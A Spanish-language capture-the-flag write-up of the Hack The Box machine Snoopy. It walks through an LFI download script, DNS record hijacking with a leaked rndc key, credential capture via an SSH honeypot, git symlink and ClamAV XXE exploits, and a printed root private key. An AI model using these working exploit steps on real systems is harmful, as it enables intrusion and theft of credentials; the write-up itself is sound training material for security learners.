---
tags:
permalink: /Snoopy-HTB-Writeup
title: Snoopy - Hard (HTB)
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,53,80 10.129.229.5
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 23:58 EST
Nmap scan report for 10.129.229.5
Host is up (0.47s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ee:6b:ce:c5:b6:e3:fa:1b:97:c0:3d:5f:e3:f1:a1:6e (ECDSA)
|_  256 54:59:41:e1:71:9a:1a:87:9c:1e:99:50:59:bf:e5:ba (ED25519)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.45 seconds
```

# Service enumeration

## DNS / Port 53 

```bash
dig any @10.129.229.5 snoopy.htb

; <<>> DiG 9.20.11-4+b1-Debian <<>> any @10.129.229.5 snoopy.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 52180
;; flags: qr aa rd; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: 87554482b302abb201000000690ad9fb93dae3a5e22b1f7a (good)
;; QUESTION SECTION:
;snoopy.htb.                    IN      ANY

;; ANSWER SECTION:
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.
snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.

;; ADDITIONAL SECTION:
ns1.snoopy.htb.         86400   IN      A       10.0.50.10
ns2.snoopy.htb.         86400   IN      A       10.0.51.10

;; Query time: 1120 msec
;; SERVER: 10.129.229.5#53(10.129.229.5) (TCP)
;; WHEN: Tue Nov 04 23:59:00 EST 2025
;; MSG SIZE  rcvd: 171

                                                                                                                                                                                             
```
```bash
dig axfr @10.129.229.5 snoopy.htb

; <<>> DiG 9.20.11-4+b1-Debian <<>> axfr @10.129.229.5 snoopy.htb
; (1 server found)
;; global options: +cmd
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.
snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.
mattermost.snoopy.htb.  86400   IN      A       172.18.0.3
mm.snoopy.htb.          86400   IN      A       127.0.0.1
ns1.snoopy.htb.         86400   IN      A       10.0.50.10
ns2.snoopy.htb.         86400   IN      A       10.0.51.10
postgres.snoopy.htb.    86400   IN      A       172.18.0.2
provisions.snoopy.htb.  86400   IN      A       172.18.0.4
www.snoopy.htb.         86400   IN      A       127.0.0.1
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
;; Query time: 1116 msec
;; SERVER: 10.129.229.5#53(10.129.229.5) (TCP)
;; WHEN: Tue Nov 04 23:59:12 EST 2025
;; XFR size: 11 records (messages 1, bytes 325)
```

Vemos algunos subdominios relacionados a la maquina y a su dominio principal ( `snoopy.htb`), asi que los colocamos dentro del archivo `/etc/hosts`.

## HTTP / Port 80

Por el puerto `80` vemos una pagina simple 

![Untitled 105](images/Untitled 105.jpg)

### Gobuster enumeration

```bash
gobuster dir -u http://snoopy.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,ini,asp,aspx,js,py,txt,md -t 200    
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://snoopy.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,ini,asp,aspx,js,py,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 178] [--> http://snoopy.htb/assets/]
/forms                (Status: 301) [Size: 178] [--> http://snoopy.htb/forms/]
/download             (Status: 200) [Size: 11363570]
/download.php         (Status: 200) [Size: 11363570]
Progress: 35368 / 11464479 (0.31%)^C
```

El escaneo de gobuster no revelo archivos interesantes de los cuales podamos aprovecharnos para recopilar datos.
Pero por otro lado, veo un link que hace una descarga al endpoint `/download?file=`, por que podriamos hacer una inyeccion de las tipicas de un `lfi`, para poder ver archivos del sistema.

Ademas en la seccion de contacto de la pagina, vemos un mensaje que dice que los registros `dns` fueron migrados y es por eso que `mail.snoopy.htb` esta offline

![Untitled 108](images/Untitled 108.jpg)

## Detecting LFI
Volviendo al boton de descarga, tratando de ver el contenido del `/etc/passwd`, vemos que aparece un output raro, con el final `PKFA` que suelen ser los `magicbytes` de un archivo `zip`.

![Untitled 107](images/Untitled 107.jpg)

Esto es interesante ya que podemos crear un script en `python` el cual haga la solicitud a la pagina solicitando x archivo y luego lo descargamos para luego descomprimirlo, y asi poder ver el contenido del cualquier archivo del sistema.

```python
import requests
import sys
import zipfile
from io import BytesIO

if len(sys.argv) < 2:
    print(f"usage: {sys.argv[0]} [full path of file]")
    sys.exit()

file = sys.argv[1]
output_file = sys.argv[2] if len(sys.argv) > 2 else None


resp = requests.get(f"http://snoopy.htb/download?file=....//....//....//....//....//....//{file}")

if len(resp.content) == 0:
    print("[-] File empty or not found")
    sys.exit()

with zipfile.ZipFile(BytesIO(resp.content)) as z:
    namelist = z.namelist()[0]
    with z.open(namelist) as f:
        file_data = f.read()

if output_file:
    with open(output_file, "wb") as f:
        f.write(file_data)
    print(f"[+] Content: {output_file}")
else:
    print(file_data.decode("utf-8", errors="ignore"))
```

## Access to Mattermost
Es asi como ahora, haciendo uso de nuestro script, podemos tratar de ver el contenido de `download.php`, que el escaneo de gobuster nos chivo.

```bash
python3 lfi.py /proc/self/cwd/download.php
<?php

$file = $_GET['file'];
$dir = 'press_package/';
$archive = tempnam(sys_get_temp_dir(), 'archive');
$zip = new ZipArchive();
$zip->open($archive, ZipArchive::CREATE);

if (isset($file)) {
        $content = preg_replace('/\.\.\//', '', $file);
        $filecontent = $dir . $content;
        if (file_exists($filecontent)) {
            if ($filecontent !== '.' && $filecontent !== '..') {
                $content = preg_replace('/\.\.\//', '', $filecontent);
                $zip->addFile($filecontent, $content);
            }
        }
} else {
        $files = scandir($dir);
        foreach ($files as $file) {
                if ($file !== '.' && $file !== '..') {
                        $zip->addFile($dir . '/' . $file, $file);
                }
        }       
}

$zip->close();
header('Content-Type: application/zip');
header("Content-Disposition: attachment; filename=press_release.zip");
header('Content-Length: ' . filesize($archive));

readfile($archive);
unlink($archive);

?>
```

Es asi como vemos como se produce el `lfi`, viendo que hace una sanitizacion un poco mala , escapando asi el payload: `../` convirtiendolo a una cadena vacia.

```bash
python3 lfi.py /etc/bind/named.conf
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the 
// structure of BIND configuration files in Debian, *BEFORE* you customize 
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

Vemos la clave `rndc-key`, la cual es importante, y lo vamos a ver mas adelante

## Shell as cbrown

`named.conf.local` tiene mas configuraciones, dentro de las cuales vemos que parece indicar que cualquier persona con la `rndc-key`puede hacer un cambio.

```bash
//
// Do any local configuration here
//

// Consider adding the 1918 zones here, if they are not used in your
// organization
//include "/etc/bind/zones.rfc1918";

zone "snoopy.htb" IN {
    type master;
    file "/var/lib/bind/db.snoopy.htb";
    allow-update { key "rndc-key"; };
    allow-transfer { 10.0.0.0/8; };
};
```

Con estos datos, podemos acceder a `mattermost.snoopy.htb`. que como podemos ver

![Untitled 109](images/Untitled 109.jpg)

Y tocando en `View in Browser`, vemos la opcion de solicitar un reseteo de password, podemos pensar en q la peticion se realiza a `mail.snoopy.htb`, de manera que el correo de recuperacion no se envia correctamente

![Untitled 110](images/Untitled 110.jpg)

De manera que podemos tratar de habilitar el `dns`: `mail.snoopy.htb`, colocando la solicitud en un `.txt` el cual vamos a indicarle con el comando `nsupdate`. Y ademas la clave

```bash
└─# cat rndc.key 
key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
                                                                                                                                                                                             
┌──(root㉿kali)-[/etc/bind]
└─# cat mail.txt     
server 10.129.229.5  // Dirección IP del servidor BIND
zone snoopy.htb      // La zona principal que contiene el subdominio mail.snoopy.htb
update add mail.snoopy.htb 86400 A 10.10.17.19 // Añade o modifica el registro A
send
```

De esta forma podemos tratar de habilitar el servidor

```bash
nsupdate -k rndc.key mail.txt
```

Y ahora mandar una reset password para `sbrown`, el cual es un usuarios que vimos en la imagen q se nos descarga del `zip`, original

![image-20230509141822502](images/image-20230509141822502.webp)

Y con nuestro servidor `smtp` con python, tratando de interceptar la peticion del email, recibimos lo siguiente.

```bash
python3 -m aiosmtpd -n -l 0.0.0.0:25
---------- MESSAGE FOLLOWS ----------
mail options: ['BODY=8BITMIME']

MIME-Version: 1.0
Subject: [Mattermost] Reset your password
Content-Transfer-Encoding: 8bit
Precedence: bulk
Message-ID: <ntnza69ig4ws49zh-1762323577@mm.snoopy.htb>
From: "No-Reply" <no-reply@snoopy.htb>
Date: Wed, 05 Nov 2025 06:19:37 +0000
Reply-To: "No-Reply" <no-reply@snoopy.htb>
To: sbrown@snoopy.htb
Auto-Submitted: auto-generated
Content-Type: multipart/alternative;
 boundary=7ecd52bfd1844f6c44effc01829a64a2a992b84636170cc6140bee47c805
X-Peer: ('10.129.229.5', 43626)

--7ecd52bfd1844f6c44effc01829a64a2a992b84636170cc6140bee47c805
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset=UTF-8

Reset Your Password
Click the button below to reset your password. If you didn=E2=80=99t reques=
t this, you can safely ignore this email.

Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3D4ziku=
ugfyozmguq3i6yjukk8hryd85kowfuwweftjkmiufezu1drxe9octo6d9qq )

The password reset link expires in 24 hours.

Questions?
Need help or have questions? Email us at support@snoopy.htb ( support@snoop=
y.htb )

=C2=A9 2022 Mattermost, Inc. 530 Lytton Avenue, Second floor, Palo Alto, CA=
, 94301
--7ecd52bfd1844f6c44effc01829a64a2a992b84636170cc6140bee47c805
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html; charset=UTF-8
```

Vemos un link de reseteo de la contraseña. El cual podemos chequearlo desde la web 

![image-20230509171438255](images/image-20230509171438255.webp)

Pero si colocamos cualquier pass, falla

![image-20230509172553956](images/image-20230509172553956.webp)

Esto se debe a que en la url hay un `=3D` y otro `=`, que en smtp es representado de manera q indica q es el final de una linea, de manera que podemos removerlo e intentar nuevamente.

![Untitled 112](images/Untitled 112.jpg)

Ahora, ya dentro de la pagina, vemos una serie de mensajes, pero uno de ellos me interesa.

```bash
cbrown
1:18 PM
Hey everyone, I just created a new channel dedicated to submitting requests for new server provisions as we start to roll out our new DevSecOps tool. 
```

Esto indica que cada uno de los `admins` tiene un plugin personalizado en el chat.

![image-20230509193211488](images/image-20230509193211488.webp)

Y vemos que si le damos a `enter`, nos sale lo siguiente.

![image-20230509193301539](images/image-20230509193301539.webp)

Vemos que podemos indicar un tipo de conexion o tal vez, un protocolo por el cual se va a realizar la peticion, como en este caso solo `ssh 2222` esta habilitado.

![Untitled 113](images/Untitled 113.jpg)

Ahora podemos tratar de ver si interceptamos algo con `nc`

```bash
nc -lnvp 2222
Listening on 0.0.0.0 2222
Connection received on 10.10.11.212 55630
SSH-2.0-paramiko_3.1.0
```

Y vemos que recibimos algo, por lo que podriamos tratar de interceptar credenciales con un `honey spot` para ssh, como `cowrie`.

```bash
docker run -p 2222:2222 cowrie/cowrie:latest
```

Y ahora volvemos a enviar la peticion, y vemos que recibimos credenciales de `cbrown`.

```bash
2023-05-10T01:54:26+0000 [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1
2023-05-10T01:54:26+0000 [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256
2023-05-10T01:54:26+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 10.10.11.212:33012 (172.17.0.2:2222) [session: 1686340e31d0]
2023-05-10T01:54:26+0000 [HoneyPotSSHTransport,0,10.10.11.212] Remote SSH version: SSH-2.0-paramiko_3.1.0
2023-05-10T01:54:26+0000 [HoneyPotSSHTransport,0,10.10.11.212] SSH client hassh fingerprint: a704be057881f0b1d623cd263e477a8b
2023-05-10T01:54:26+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ssh-ed25519'
2023-05-10T01:54:26+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
2023-05-10T01:54:26+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
2023-05-10T01:54:26+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
2023-05-10T01:54:26+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
2023-05-10T01:54:26+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'cbrown' trying auth b'password'
2023-05-10T01:54:26+0000 [HoneyPotSSHTransport,0,10.10.11.212] Could not read etc/userdb.txt, default database activated
2023-05-10T01:54:26+0000 [HoneyPotSSHTransport,0,10.10.11.212] login attempt [b'cbrown'/b'sn00pedcr3dential!!!'] failed
2023-05-10T01:54:27+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'cbrown' failed auth b'password'
2023-05-10T01:54:27+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
```

## Shell as sbrown

Y ahora con las credenciales podemos conectarnos a `ssh`.

```bash
ssh cbrown@snoopy.htb                       
The authenticity of host 'snoopy.htb (10.129.229.5)' can't be established.
ED25519 key fingerprint is SHA256:XCYXaxdk/Kqjbrpe8gktW9N6/6egnc+Dy9V6SiBp4XY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'snoopy.htb' (ED25519) to the list of known hosts.
cbrown@snoopy.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
cbrown@snoopy:~$ whoami
cbrown
```

Viendo los privilegios que tenemos, vemos que podemos usar `git` y ejecutarlo con el parametro `apply` seguido de cualquier cosa como el usuario `sbrown`.

```bash
[sudo] password for cbrown: 
Matching Defaults entries for cbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
```

Podemos ver la version que corre para este git y asi ver alguna vulnerabilidad. Y encontramos el siguiente [enlace](https://github.com/bruno-1337/CVE-2023-23946-POC) la cual se trata de un abuso de los `symlinks`, ya que en esta version, `git` no maneja los links simbolicos de manera correcta haciendo que asi podamos apuntar a determinados archivos y poder escribir en ellos.

```bash
cbrown@snoopy:~$ /usr/bin/git --version
git version 2.34.1
```

Para eso creemos un directorio en `/tmp`

```bash 
mkdir /tmp/poc
```

Ahora creamos el `symlink` dentro del directorio que creamos apuntando de ejemplo a el directorio personal de `cbrown`.

```bash
ln -s /home/cbrown/ symlink
```

Y dentro del directorio que creamos, creamos un archivo `patch`, con el contenido que se demuestra en el `PoC`.

```bash
diff --git a/symlink b/newsymlink
rename from symlink
rename to newsymlink
--
diff --git /dev/null b/newsymlink/zs1n
new file mode 100644
index 0000000..e47f4ea
--- /dev/null
+++ b/newsymlink/zs1n
@@ -0,0 +1 @@
+pwned
```

Luego podemos probar el uso de `git apply`.

```bash
git apply patch
```

Y viendo el contenido del `symlink`, vemos nuestro mensaje.

```
cbrown@snoopy:/dev/shm/poc$ cat ~/zs1n 
pwned
```

De esta manera ahora podemos repetir el proceso, pero esta vez reemplazamos nuestro mensaje en un archivo `authorized_keys` con el contenido de una clave `ed26619` que vamos a crear desde nuestra maquina para así la clave la colocamos en el directorio  `.ssh` de `sbrown`.

Primero creamos un directorio `ssh`.

```bash
cbrown@snoopy:/tmp$ mkdir ssh
```

Y ahora dentro del mismo creamos el link 

```bash
cbrown@snoopy:/tmp$ ln -s /home/sbrown/.ssh symlink
```

Ya una vez hecho esto creamos el patch con el contenido de nuestra `.pub`

```bash
diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
--
diff --git /dev/null b/renamed-symlink/authorized_keys
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/authorized_keys
@@ -0,0 +1,1 @@
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d root@kali
```

Y ahora ejecutamos el comando.

```bash
cbrown@snoopy:/dev/ssh$ sudo -u sbrown git apply -v patch
[sudo] password for cbrown: 
warning: unable to unlink 'symlink': Permission denied
error: unable to write file 'renamed-symlink' mode 120000: No such file or directory
```

Este error es por los permisos de la carpeta, asi que la modificamos.

```bash 
chmod 777 ssh/
```

```bash
cbrown@snoopy:/dev/shm/ssh$ sudo -u sbrown git apply patch
```

Y ahora usando la misma clave desde nuestra maquina podemos ingresar como el usuario `sbrown`.

```bash
ssh -i /root/.ssh/id_ed25519 sbrown@snoopy.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

sbrown@snoopy:~$
```

Ya podemos ver la primera `flag`.

```bash
sbrown@snoopy:~$ cat user.txt 
fb149f2c02f8a0d919e850aa45530917
```
## Shell as root

Viendo si tenemos permisos a nivel de `sudoers` nuevamente, vemos que si, pero esta vez en clascan
```bash
sbrown@snoopy:~$ sudo -l
Matching Defaults entries for sbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
```

Podriamos buscar vulns relacionados a este binario, y encontramos lo [siguiente](https://github.com/nokn0wthing/CVE-2023-20052)

Que es un repo que nos automatiza todo el ataque.

Clonamos el repo
```bash
git clone https://github.com/nokn0wthing/CVE-2023-20052.git
```

Ya una vez dentro del mismo, tenemos que construir el contenedor.

```bash
sudo docker build -t cve-2023-20052 .
```

Ahora podemos correr el contenedor
```bash
sudo docker run -v $(pwd):/exploit -it cve-2023-20052 bash
root@3540f51c0c9f:/exploit# genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . && dmg dmg test.img test.dmg
genisoimage: Warning: no Apple/Unix files will be decoded/mapped
Total translation table size: 0
Total rockridge attributes bytes: 6910
Total directory bytes: 35850
Path table size(bytes): 224
Max brk space used 22000
254 extents written (0 MB)
Processing DDM...
No DDM! Just doing one huge blkx then...
run 0: sectors=512, left=1016
run 1: sectors=504, left=504
Writing XML data...
Generating UDIF metadata...
Master checksum: 4ed2260e
Writing out UDIF resource file...
Cleaning up...
Done
```

Y ya luego podemos construir el archivo tratando de exfiltrar la clave `id_rsa` de `root`
```bash
root@3540f51c0c9f:/exploit# bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg
```

Ya una vez con esto, la imagen se encuentra en nuestro directorio y asi la subimos a la maquina para luego con `clamscan` con el parametro debug podemos pasarle la imagen y se ejecute la vulnerabilidad

```bash
wget http://10.10.17.19/exploit.dmg
--2025-11-05 07:55:46--  http://10.10.17.19/exploit.dmg
Connecting to 10.10.17.19:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 198080 (193K) [application/x-apple-diskimage]
Saving to: ‘exploit.dmg’

exploit.dmg                                     100%[====================================================================================================>] 193.44K  80.2KB/s    in 2.4s    

2025-11-05 07:55:50 (80.2 KB/s) - ‘exploit.dmg’ saved [198080/198080]
```

```bash
sbrown@snoopy:~$ sudo clamscan --debug /home/sbrown/scanfiles/exploit.dmg
```

Y asi con exito vemos el contenido de la clave

```bash
[..snip..]
tected
LibClamAV debug: cli_magic_scan: returning 0  at line 4997
LibClamAV debug: clean_cache_add: 72f7670004669c8be768e6c3a7848cea (level 0)
LibClamAV debug: cli_scandmg: wanted blkx, text value is -----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

LibClamAV debug: cli_scandmg: wanted blkx, text value is cSum
LibClamAV debug: cli_scandmg: wanted blkx, text value is nsiz
LibClamAV debug: cli_scandmg: wanted blkx, text value is plst
LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
LibClamAV debug: matcher_run: performing regex matching on full map: 123072+75008(198080) >= 198080
LibClamAV debug: hashtab: Freeing hashset, elements: 0, capacity: 0
LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
LibClamAV debug: cli_magic_scan: returning 0  at line 4997
LibClamAV debug: clean_cache_add: 81c7701c0fe770de75991cdfb2248628 (level 0)
LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
/home/sbrown/scanfiles/exploit.dmg: OK
LibClamAV debug: Cleaning up phishcheck
LibClamAV debug: Freeing phishcheck struct
LibClamAV debug: Phishcheck cleaned up

----------- SCAN SUMMARY -----------
Known viruses: 8659055
Engine version: 1.0.0
Scanned directories: 0
Scanned files: 1
Infected files: 0
Data scanned: 0.39 MB
Data read: 0.19 MB (ratio 2.08:1)
Time: 18.480 sec (0 m 18 s)
Start Date: 2025:11:05 07:56:47
End Date:   2025:11:05 07:57:05
```

Y ahora con la misma podemos usarla como clave de identidad para conectarnos como `root`.

```bash
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/snoopy]
└─# nvim id_rsa    
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/snoopy]
└─# chmod 600 id_rsa               
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/snoopy]
└─# ssh -i id_rsa root@snoopy.htb                             
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri May 12 21:28:56 2023 from 10.10.14.46
root@snoopy:~# cat root.txt 
51f371aa0c77623e6a6e2c259dc35bd9
root@snoopy:~#
```

`~Happy Hacking.`



